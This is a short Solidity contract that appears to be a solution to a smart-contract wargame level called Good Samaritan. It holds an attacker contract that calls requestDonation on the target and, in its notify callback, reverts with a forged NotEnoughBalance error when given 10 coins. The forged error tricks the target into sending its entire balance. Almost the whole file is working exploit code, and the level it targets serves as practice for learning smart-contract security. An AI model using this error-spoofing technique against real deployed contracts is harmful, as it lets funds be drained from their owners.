pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "./27-GoodSamaritan.sol";
import "hardhat/console.sol";

contract GoodSamaritanAttacker is INotifyable {

  GoodSamaritan samaritan;
  error NotEnoughBalance();

  constructor(address addr) {
    samaritan = GoodSamaritan(addr);
  }

  function attack() external {
    samaritan.requestDonation();
  }

  function notify(uint256 amount) public {
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }
}
